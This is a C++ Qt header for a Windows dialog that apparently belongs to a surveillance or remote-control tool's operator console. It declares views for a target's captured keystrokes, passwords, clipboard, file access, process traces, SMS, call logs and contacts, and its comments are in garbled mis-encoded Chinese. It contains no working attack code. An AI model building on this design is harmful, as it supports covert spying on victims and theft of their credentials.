#ifndef USERACTIONDLG_H
#define USERACTIONDLG_H

#include <QWidget>
#include <QTimer>

#include "ui_useractiondlg.h"

#include <Windows.h>

class Target;
class WaitDlg;

class UserActionDlg : public QWidget
{
	Q_OBJECT

public:
	UserActionDlg(QWidget *parent, Target* tar);
	~UserActionDlg();

public:
	void GetNewPluginData(MSG* msg);

signals:

	// ����ͨ����¼����ѯ�����غܷ�ʱ�䣬�ʷ����ź�
	void emitCallInfo(unsigned int targetId, QTableWidget* table);

	// ���̼�¼
	void emitKeyboardInfo(unsigned int targetId, PageTableWidget* table);

public slots:
	void onQueryKeyboardInfoFinished(unsigned int tarId);

private:
	void InitUserAction();
	void InitConnection();
	void InitWidgetAppearance();

private slots:

	// ��ʱˢ������
	void RefreshUserActionData();

	// �������û���Ϊ�б�
	void onTrUserActionItemClicked(QTreeWidgetItem* item, int column);

	// ������̼�¼�б��е�ĳһ��
	void onTbKeyboardRecordItemClicked(QTableWidgetItem* item);

	// ��������¼�б��е�ĳһ��
	void onTbPasswordRecordItemClicked(QTableWidgetItem* item);

	// ����������¼�б��е�ĳһ��
	void onTbClipboardDataItemClicked(QTableWidgetItem* item);

	// ������ż�¼�б��е�ĳһ��
	void onTbMessageInfoItemClicked(QTableWidgetItem* item);

private:

	// ��ʼ���Ҳ�����б�
	void InitUserActionData();

	// ˢ���û��ļ���Ϊ
	void RefreshUserFOIData();

	// ˢ�¼��̼�¼
	void RefreshIMEData();

	// ˢ�������¼
	void RefreshPWIData();

	// ˢ�¼������¼
	void RefreshCBDData();

	// ˢ�½����ļ����ʼ�¼
	void RefreshFOIData();

	// ˢ�½���ִ�й켣��¼
	void RefreshPEIData();

	// ˢ�¶��ż�¼
	void RefreshSMSData();

	// ˢ��ͨ����¼
	void RefreshCALData();

	// ˢ��ͨѶ¼
	void RefreshCONTACTData();

	void InsertIMEData(
		LONG time, 
		const std::wstring& proc, 
		int procId, 
		const std::wstring& caption, 
		const std::wstring& content);

	void InsertSMSData(
		LONG type,
		const std::wstring& address,
		const std::wstring& message,
		const std::wstring& date);

	void InsertCALData(
		LONG type,
		const std::wstring& address,
		const std::wstring& date,
		int duration);

	void InsertCONTACTData(
		const std::wstring& name,
		const std::wstring& phone,
		const std::wstring& remark);

private:
	Ui::UserActionDlg ui;
	Target* m_tar;

	WaitDlg* m_waitKeyboardInfoDlg;
	bool m_queryKeyboardInfoFinished;

	QTimer m_refreshTimer;

	// �½� | ���� | ���� ...
	CHAR opType[MAX_PATH];
};

#endif // USERACTIONDLG_H
